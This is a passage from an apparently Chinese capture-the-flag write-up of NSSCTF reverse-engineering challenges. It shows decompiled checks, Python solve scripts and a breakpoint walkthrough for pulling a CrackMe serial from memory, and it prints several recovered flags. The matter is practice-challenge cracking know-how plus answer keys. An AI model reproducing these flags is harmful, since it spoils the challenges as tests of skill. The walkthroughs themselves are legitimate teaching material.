class="code"><pre><span class="line">s = <span class="built_in">str</span>(<span class="built_in">input</span>(<span class="string">&quot;please input your flag:&quot;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">arr=[<span class="number">29</span>, <span class="number">0</span>, <span class="number">16</span>, <span class="number">23</span>, <span class="number">18</span>, <span class="number">61</span>, <span class="number">43</span>, <span class="number">41</span>, <span class="number">13</span>, <span class="number">28</span>, <span class="number">88</span>, <span class="number">94</span>, <span class="number">49</span>, <span class="number">110</span>, <span class="number">66</span>, <span class="number">44</span>, <span class="number">43</span>, <span class="number">28</span>, <span class="number">91</span>, <span class="number">108</span>, <span class="number">61</span>, <span class="number">7</span>, <span class="number">22</span>, <span class="number">7</span>, <span class="number">43</span>, <span class="number">51</span>, <span class="number">44</span>, <span class="number">46</span>, <span class="number">9</span>, <span class="number">18</span>, <span class="number">20</span>, <span class="number">6</span>, <span class="number">2</span>, <span class="number">24</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">len</span>(s)!=<span class="number">35</span>  <span class="keyword">or</span> s[<span class="number">0</span>]!=<span class="string">&#x27;N&#x27;</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;error&quot;</span>)</span><br><span class="line">    exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="built_in">len</span>(s)):</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">ord</span>(s[i-<span class="number">1</span>])^<span class="built_in">ord</span>(s[i])!=arr[i-<span class="number">1</span>]):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;error!&quot;</span>)</span><br><span class="line">        exit(<span class="number">0</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;right!&quot;</span>)</span><br></pre></td></tr></table></figure><p>python逆向。这题直接给源码了。要求ord(s[i-1])^ord(s[i])!=arr[i-1]，已知s[0] = ‘N’。那么就能递推后面的s[i]了：s[i+1] = arr[i]^s[i]。</p><p>exp.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">arr = [<span class="number">29</span>, <span class="number">0</span>, <span class="number">16</span>, <span class="number">23</span>, <span class="number">18</span>, <span class="number">61</span>, <span class="number">43</span>, <span class="number">41</span>, <span class="number">13</span>, <span class="number">28</span>, <span class="number">88</span>, <span class="number">94</span>, <span class="number">49</span>, <span class="number">110</span>, <span class="number">66</span>, <span class="number">44</span>, <span class="number">43</span>, <span class="number">28</span>, <span class="number">91</span>, <span class="number">108</span>, <span class="number">61</span>, <span class="number">7</span>, <span class="number">22</span>, <span class="number">7</span>, <span class="number">43</span>, <span class="number">51</span>, <span class="number">44</span>, <span class="number">46</span>, <span class="number">9</span>, <span class="number">18</span>, <span class="number">20</span>, <span class="number">6</span>, <span class="number">2</span>, <span class="number">24</span>]</span><br><span class="line">s = &#123;&#125;</span><br><span class="line">flag=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(arr)):</span><br><span class="line">    s[<span class="number">0</span>] = <span class="built_in">ord</span>(<span class="string">&#x27;N&#x27;</span>)</span><br><span class="line">    s[i+<span class="number">1</span>] = arr[i]^s[i]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(s)):</span><br><span class="line">    flag += <span class="built_in">chr</span>(s[i])</span><br><span class="line">    </span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><p>NSSCTF{Pyth0n_1s_th3_best_l@nguage</p><h3 id="CrackMe"><a href="#CrackMe" class="headerlink" title="CrackMe"></a>CrackMe</h3><p>不怎么会od，官方wp。</p><p>找出CreakMe的Serial</p><p>要学习使用Olldbg的使用</p><p><a href="https://bbs.pediy.com/thread-271168.htm">[原创]《使用 OD 从零开始 Cracking》学习笔记-软件逆向-看雪论坛-安全社区|安全招聘|bbs.pediy.com</a></p><p>通过OD中的字符串查找插件找到判断正确或错误的字符串位置</p><p>使用F2 设置断点 然后F9运行</p><p>在内存中找到了明文比较的serial 取出来即可</p><p>注意这个172….是错误的 需要在内存中找到真正的字符串</p><h2 id="Week2"><a href="#Week2" class="headerlink" title="Week2"></a>Week2</h2><h3 id="Little-Endian"><a href="#Little-Endian" class="headerlink" title="Little Endian"></a>Little Endian</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">char</span> v4[<span class="number">36</span>]; <span class="comment">// [rsp+20h] [rbp-30h] BYREF</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+44h] [rbp-Ch]</span></span><br><span class="line">  <span class="type">char</span> *v6; <span class="comment">// [rsp+48h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  _main();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;please input your flag&quot;</span>);</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, v4);</span><br><span class="line">  v6 = v4;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">5</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( *(_DWORD *)v6 != (enc[i] ^ <span class="number">0x12345678</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Data3rr0r!&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    v6 += <span class="number">4</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;you are right!&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>enc里面就是密文了，逻辑就是v6和enc[i]^0x12345678比较，每次v6都会自增4（没软用）。要注意的是<em>(_DWORD </em>)v6是大端序，但是数据在内存中都是小端序，所以要将其反转一下。一般在CPU，x86都是小端序，但是IDA会将之转换为了大端序。python不怎么熟，就直接暴力切片了。</p><p><img src="https://s2.loli.net/2023/08/04/oN9ybAe3Mz5digR.png" alt="image-20221020102007833.png"></p><p><img src="https://s2.loli.net/2023/08/04/kGTB3Njb4HlCAYh.png" alt="image-20221012173123111.png"></p><p>exp.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">enc = [<span class="number">0x51670536</span>, <span class="number">0x5E4F102C</span>, <span class="number">0x7E402211</span>, <span class="number">0x7C71094B</span>, <span class="number">0x7C553F1C</span>, <span class="number">0x6F5A3816</span>]</span><br><span class="line">dex = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(enc)):</span><br><span class="line">    flag = enc[i]^<span class="number">0x12345678</span></span><br><span class="line">    dex = dex +<span class="built_in">hex</span>(flag)[<span class="number">8</span>:<span class="number">10</span>]+<span class="built_in">hex</span>(flag)[<span class="number">6</span>:<span class="number">8</span>]+<span class="built_in">hex</span>(flag)[<span class="number">4</span>:<span class="number">6</span>]+<span class="built_in">hex</span>(flag)[<span class="number">2</span>:<span class="number">4</span>]</span><br><span class="line"><span class="built_in">print</span>(base64.b16decode(dex.upper()))</span><br></pre></td></tr></table></figure><p>NSSCTF{Littl3_Endiannnn}</p><h3 id="Easy-Android"><a href="#Easy-Android" class="headerlink" title="Easy_Android"></a>Easy_Android</h3><p>jeb反编译，看核心代码，jav代码审计。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.crackme;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.app.Activity;</span><br><span class="line"><span class="keyword">import</span> android.os.Bundle;</span><br><span class="line"><span class="keyword">import</span> android.view.Menu;</span><br><span class="line"><span class="keyword">import</span> android.view.View.OnClickListener;</span><br><span class="line"><span class="keyword">import</span> android.view.View;</span><br><span class="line"><span class="keyword">import</span> android.widget.Button;</span><br><span class="line"><span class="keyword">import</span> android.widget.EditText;</span><br><span class="line"><span class="keyword">import</span> android.widget.Toast;</span><br><span class="line"><span class="keyword">import</span> java.security.MessageDigest;</span><br><span class="line"><span class="keyword">import</span> java.security.NoSuchAlgorithmException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MainActivity</span> <span class="keyword">extends</span> <span class="title class_">Activity</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> Button btn_register;</span><br><span class="line">    <span class="keyword">private</span> EditText edit_sn;</span><br><span class="line">    String edit_userName;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="type">boolean</span> <span class="title function_">checkSN</span><span class="params">(String arg11, String arg12)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(arg11 == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">if</span>(arg11.length() != <span class="number">0</span> &amp;&amp; (arg12 != <span class="literal">null</span> &amp;&amp; arg12.length() == <span class="number">22</span>)) &#123;</span><br><span class="line">                <span class="type">MessageDigest</span> <span class="variable">digest</span> <span class="operator">=</span> MessageDigest.getInstance(<span class="string">&quot;MD5&quot;</span>);</span><br><span class="line">                digest.reset();</span><br><span class="line">                digest.update(arg11.getBytes());</span><br><span class="line">                <span class="type">String</span> <span class="variable">hexstr</span> <span class="operator">=</span> MainActivity.toHexString(digest.digest(), <span class="string">&quot;&quot;</span>);</span><br><span class="line">                <span class="type">StringBuilder</span> <span class="variable">sb</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">                <span class="type">int</span> i;</span><br><span class="line">                <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; hexstr.length(); i += <span class="number">2</span>) &#123;</span><br><span class="line">                    sb.append(((<span class="type">char</span>)hexstr.charAt(i)));</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="type">boolean</span> <span class="variable">v8</span> <span class="operator">=</span> <span class="string">&quot;flag&#123;&quot;</span> + sb.toString() + <span class="string">&quot;&#125;&quot;</span>.equalsIgnoreCase(arg12);</span><br><span class="line">                <span class="keyword">return</span> v8;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span>(NoSuchAlgorithmException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span>  <span class="comment">// android.app.Activity</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle arg3)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onCreate(arg3);</span><br><span class="line">        <span class="built_in">this</span>.setContentView(<span class="number">0x7F040019</span>);  <span class="comment">// layout:activity_main</span></span><br><span class="line">        <span class="built_in">this</span>.setTitle(<span class="number">0x7F06001D</span>);  <span class="comment">// string:unregister &quot;TopCtf&quot;</span></span><br><span class="line">        <span class="built_in">this</span>.edit_userName = <span class="string">&quot;Tenshine&quot;</span>;</span><br><span class="line">        <span class="built_in">this</span>.edit_sn = (EditText)<span class="built_in">this</span>.findViewById(<span class="number">0x7F0C0051</span>);  <span class="comment">// id:edit_sn</span></span><br><span class="line">        <span class="built_in">this</span>.btn_register = (Button)<span class="built_in">this</span>.findViewById(<span class="number">0x7F0C0052</span>);  <span class="comment">// id:button_register</span></span><br><span class="line">        <span class="built_in">this</span>.btn_register.setOnClickListener(<span class="keyword">new</span> <span class="title class_">View</span>.OnClickListener() &#123;</span><br><span class="line">            <span class="meta">@Override</span>  <span class="comment">// android.view.View$OnClickListener</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onClick</span><span class="params">(View v)</span> &#123;</span><br><span class="line">                <span class="type">String</span> <span class="variable">v1</span> <span class="operator">=</span> MainActivity.<span class="built_in">this</span>.edit_userName.trim();</span><br><span class="line">                <span class="type">String</span> <span class="variable">v2</span> <span class="operator">=</span> MainActivity.<span class="built_in">this</span>.edit_sn.getText().toString().trim();</span><br><span class="line">                <span class="keyword">if</span>(!MainActivity.<span class="built_in">this</span>.checkSN(v1, v2)) &#123;</span><br><span class="line">                    Toast.makeText(MainActivity.<span class="built_in">this</span>, <span class="number">0x7F06001E</span>, <span class="number">0</span>).show();  <span class="comment">// string:unsuccessed &quot;错误!&quot;</span></span><br><span class="line">                    <span class="keyword">return</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                Toast.makeText(MainActivity.<span class="built_in">this</span>, <span class="number">0x7F06001B</span>, <span class="number">0</span>).show();  <span class="comment">// string:successed &quot;恭喜您！&quot;</span></span><br><span class="line">                MainActivity.<span class="built_in">this</span>.btn_register.setEnabled(<span class="literal">false</span>);</span><br><span class="line">                MainActivity.<span class="built_in">this</span>.setTitle(<span class="number">0x7F060019</span>);  <span class="comment">// string:registered &quot;恭喜&quot;</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span>  <span class="comment">// android.app.Activity</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">onCreateOptionsMenu</span><span class="params">(Menu menu)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.getMenuInflater().inflate(<span class="number">0x7F0D0000</span>, menu);  <span class="comment">// menu:activity_main</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> String <span class="title function_">toHexString</span><span class="params">(<span class="type">byte</span>[] arg8, String arg9)</span> &#123;</span><br><span class="line">        <span class="type">StringBuilder</span> <span class="variable">hexString</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">        <span class="type">int</span> i$;</span><br><span class="line">        <span class="keyword">for</span>(i$ = <span class="number">0</span>; i$ &lt; arg8.length; ++i$) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">hex</span> <span class="operator">=</span> Integer.toHexString(arg8[i$] &amp; <span class="number">0xFF</span>);</span><br><span class="line">            <span class="keyword">if</span>(hex.length() == <span class="number">1</span>) &#123;</span><br><span class="line">                hexString.append(<span class="string">&#x27;0&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            hexString.append(hex).append(arg9);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> hexString.toString();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Tenshine经过md5加密后得到的字符串，每次取i += 2，得到flag。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="built_in">str</span> = <span class="string">&#x27;Tenshine&#x27;</span></span><br><span class="line">md5 = hashlib.md5(<span class="built_in">str</span>.encode(<span class="string">&#x27;utf-8&#x27;</span>)).hexdigest()</span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span> </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(md5),<span class="number">2</span>):</span><br><span class="line">    flag += md5[i]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;NSSCTF&#123;%s&#125;&#x27;</span>%flag)</span><br></pre></td></tr></table></figure><h3 id="来解个方程"><a href="#来解个方程" class="headerlink" title="来解个方程?"></a>来解个方程?</h3><p>ida进入核心函数，可以看到result = (unsigned int)(186 <em> v18 + 2712 </em> v17 + 2136 <em> v16 + 98 </em> v13 + 138 <em> v14 + 3584 </em> v15 + 1173 * v19，那么我们的目标就是求这几个参数了。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">check</span><span class="params">(_BYTE *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// [rsp+20h] [rbp-A0h]</span></span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// [rsp+24h] [rbp-9Ch]</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// [rsp+28h] [rbp-98h]</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// [rsp+2Ch] [rbp-94h]</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// [rsp+30h] [rbp-90h]</span></span><br><span class="line">  <span class="type">int</span> v7; <span class="comment">// [rsp+34h] [rbp-8Ch]</span></span><br><span class="line">  <span class="type">int</span> v8; <span class="comment">// [rsp+38h] [rbp-88h]</span></span><br><span class="line">  <span class="type">int</span> v9; <span class="comment">// [rsp+3Ch] [rbp-84h]</span></span><br><span class="line">  <span class="type">int</span> v10; <span class="comment">// [rsp+40h] [rbp-80h]</span></span><br><span class="line">  <span class="type">int</span> v11; <span class="comment">// [rsp+44h] [rbp-7Ch]</span></span><br><span class="line">  <span class="type">int</span> v12; <span class="comment">// [rsp+48h] [rbp-78h]</span></span><br><span class="line">  <span class="type">int</span> v13; <span class="comment">// [rsp+4Ch] [rbp-74h]</span></span><br><span class="line">  <span class="type">int</span> v14; <span class="comment">// [rsp+50h] [rbp-70h]</span></span><br><span class="line">  <span class="type">int</span> v15; <span class="comment">// [rsp+54h] [rbp-6Ch]</span></span><br><span class="line">  <span class="type">int</span> v16; <span class="comment">// [rsp+58h] [rbp-68h]</span></span><br><span class="line">  <span class="type">int</span> v17; <span class="comment">// [rsp+5Ch] [rbp-64h]</span></span><br><span class="line">  <span class="type">int</span> v18; <span class="comment">// [rsp+60h] [rbp-60h]</span></span><br><span class="line">  <span class="type">int</span> v19; <span class="comment">// [rsp+64h] [rbp-5Ch]</span></span><br><span class="line">  <span class="type">int</span> v20; <span class="comment">// [rsp+68h] [rbp-58h]</span></span><br><span class="line">  <span class="type">int</span> v21; <span class="comment">// [rsp+6Ch] [rbp-54h]</span></span><br><span class="line">  <span class="type">int</span> v22; <span class="comment">// [rsp+70h] [rbp-50h]</span></span><br><span class="line">  <span class="type">int</span> v23; <span class="comment">// [rsp+74h] [rbp-4Ch]</span></span><br><span class="line">  <span class="type">int</span> j; <span class="comment">// [rsp+ACh] [rbp-14h]</span></span><br><span class="line">  _BYTE *i; <span class="comment">// [rsp+B0h] [rbp-10h]</span></span><br><span class="line">  <span class="type">int</span> v26; <span class="comment">// [rsp+BCh] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  v26 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = a1; *i; ++i )</span><br><span class="line">    ++v26;</span><br><span class="line">  <span class="keyword">if</span> ( v26 == <span class="number">22</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt; v26; ++j )</span><br><span class="line">      *(&amp;v2 + j) = (<span class="type">char</span>)a1[j];</span><br><span class="line">    <span class="keyword">if</span> ( <span class="number">245</span> * v6 + <span class="number">395</span> * v5 + <span class="number">3541</span> * v4 + <span class="number">2051</span> * v3 + <span class="number">3201</span> * v2 + <span class="number">1345</span> * v7 != <span class="number">855009</span></span><br><span class="line">      || <span class="number">3270</span> * v6 + <span class="number">3759</span> * v5 + <span class="number">3900</span> * v4 + <span class="number">3963</span> * v3 + <span class="number">1546</span> * v2 + <span class="number">3082</span> * v7 != <span class="number">1515490</span></span><br><span class="line">      || <span class="number">526</span> * v6 + <span class="number">2283</span> * v5 + <span class="number">3349</span> * v4 + <span class="number">2458</span> * v3 + <span class="number">2012</span> * v2 + <span class="number">268</span> * v7 != <span class="number">854822</span></span><br><span class="line">      || <span class="number">3208</span> * v6 + <span class="number">2021</span> * v5 + <span class="number">3146</span> * v4 + <span class="number">1571</span> * v3 + <span class="number">2569</span> * v2 + <span class="number">1395</span> * v7 != <span class="number">1094422</span></span><br><span class="line">      || <span class="number">3136</span> * v6 + <span class="number">3553</span> * v5 + <span class="number">2997</span> * v4 + <span class="number">1824</span> * v3 + <span class="number">1575</span> * v2 + <span class="number">1599</span> * v7 != <span class="number">1136398</span></span><br><span class="line">      || <span class="number">2300</span> * v6 + <span class="number">1349</span> * v5 + <span class="number">86</span> * v4 + <span class="number">3672</span> * v3 + <span class="number">2908</span> * v2 + <span class="number">1681</span> * v7 != <span class="number">939991</span></span><br><span class="line">      || <span class="number">212</span> * v22 + <span class="number">153</span> * v21 + <span class="number">342</span> * v20 + <span class="number">490</span> * v12 + <span class="number">325</span> * v11 + <span class="number">485</span> * v10 + <span class="number">56</span> * v9 + <span class="number">202</span> * v8 + <span class="number">191</span> * v23 != <span class="number">245940</span></span><br><span class="line">      || <span class="number">348</span> * v22 + <span class="number">185</span> * v21 + <span class="number">134</span> * v20 + <span class="number">153</span> * v12 + <span class="number">460</span> * v9 + <span class="number">207</span> * v8 + <span class="number">22</span> * v10 + <span class="number">24</span> * v11 + <span class="number">22</span> * v23 != <span class="number">146392</span></span><br><span class="line">      || <span class="number">177</span> * v22 + <span class="number">231</span> * v21 + <span class="number">489</span> * v20 + <span class="number">339</span> * v12 + <span class="number">433</span> * v11 + <span class="number">311</span> * v10 + <span class="number">164</span> * v9 + <span class="number">154</span> * v8 + <span class="number">100</span> * v23 != <span class="number">239438</span></span><br><span class="line">      || <span class="number">68</span> * v20 + <span class="number">466</span> * v12 + <span class="number">470</span> * v11 + <span class="number">22</span> * v10 + <span class="number">270</span> * v9 + <span class="number">360</span> * v8 + <span class="number">337</span> * v21 + <span class="number">257</span> * v22 + <span class="number">82</span> * v23 != <span class="number">233887</span></span><br><span class="line">      || <span class="number">246</span> * v22 + <span class="number">235</span> * v21 + <span class="number">468</span> * v20 + <span class="number">91</span> * v12 + <span class="number">151</span> * v11 + <span class="number">197</span> * v8 + <span class="number">92</span> * v9 + <span class="number">73</span> * v10 + <span class="number">54</span> * v23 != <span class="number">152663</span></span><br><span class="line">      || <span class="number">241</span> * v22 + <span class="number">377</span> * v21 + <span class="number">131</span> * v20 + <span class="number">243</span> * v12 + <span class="number">233</span> * v11 + <span class="number">55</span> * v10 + <span class="number">376</span> * v9 + <span class="number">242</span> * v8 + <span class="number">343</span> * v23 != <span class="number">228375</span></span><br><span class="line">      || <span class="number">356</span> * v22 + <span class="number">200</span> * v21 + <span class="number">136</span> * v11 + <span class="number">301</span> * v10 + <span class="number">284</span> * v9 + <span class="number">364</span> * v8 + <span class="number">458</span> * v12 + <span class="number">5</span> * v20 + <span class="number">61</span> * v23 != <span class="number">211183</span></span><br><span class="line">      || <span class="number">154</span> * v22 + <span class="number">55</span> * v21 + <span class="number">406</span> * v20 + <span class="number">107</span> * v12 + <span class="number">80</span> * v10 + <span class="number">66</span> * v8 + <span class="number">71</span> * v9 + <span class="number">17</span> * v11 + <span class="number">71</span> * v23 != <span class="number">96788</span></span><br><span class="line">      || <span class="number">335</span> * v22 + <span class="number">201</span> * v21 + <span class="number">197</span> * v11 + <span class="number">280</span> * v10 + <span class="number">409</span> * v9 + <span class="number">56</span> * v8 + <span class="number">494</span> * v12 + <span class="number">63</span> * v20 + <span class="number">99</span> * v23 != <span class="number">204625</span></span><br><span class="line">      || <span class="number">428</span> * v18 + <span class="number">1266</span> * v17 + <span class="number">1326</span> * v16 + <span class="number">1967</span> * v15 + <span class="number">3001</span> * v14 + <span class="number">81</span> * v13 + <span class="number">2439</span> * v19 != <span class="number">1109296</span></span><br><span class="line">      || <span class="number">2585</span> * v18 + <span class="number">4027</span> * v17 + <span class="number">141</span> * v16 + <span class="number">2539</span> * v15 + <span class="number">3073</span> * v14 + <span class="number">164</span> * v13 + <span class="number">1556</span> * v19 != <span class="number">1368547</span></span><br><span class="line">      || <span class="number">2080</span> * v18 + <span class="number">358</span> * v17 + <span class="number">1317</span> * v16 + <span class="number">1341</span> * v15 + <span class="number">3681</span> * v14 + <span class="number">2197</span> * v13 + <span class="number">1205</span> * v19 != <span class="number">1320274</span></span><br><span class="line">      || <span class="number">840</span> 